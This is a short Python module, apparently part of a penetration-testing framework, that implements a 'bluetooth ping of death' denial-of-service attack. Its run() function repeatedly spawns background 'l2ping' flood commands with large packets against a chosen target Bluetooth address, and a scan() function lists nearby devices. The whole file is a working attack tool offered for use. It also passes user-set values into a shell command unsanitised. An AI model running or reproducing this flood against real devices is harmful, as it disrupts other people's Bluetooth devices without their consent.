#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import os
import subprocess
import time
from core import colors
from collections import OrderedDict

# Info about the module
#modules name
name = "bluetooth_pod"
#version
version = "1.0"
# Description
desc = "bluetooth ping of death"
# Creator's github
github = "4shadoww"
#created by
createdby = "4shadoww"
# Email
email = "4shadoww0@gmail.com"

needroot = 1

#list
variables = OrderedDict((
('interface', 'hci0'),
('bdaddr', 'none'),
('size', '600'),
))

# Description for variables
vdesc = [
'interface',
'target bluetooth address',
'size of packets (default 600)',
]

#custom commands
customcommands = (
'scan'
)

# Help for the custom commands (remove if you will not use custom commands)
mhelp = OrderedDict((
('scan', 'scan for devices'),
))

#terminal from main
terminal = None

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.blue + "[*]Bluetooth Ping Of Death Attack Started ..." + colors.end)
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'], variables['size'], variables['bdaddr'])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		print(colors.red + "[*] Something Is Wrong!" + colors.end)


def scan():
	os.system("hcitool scan")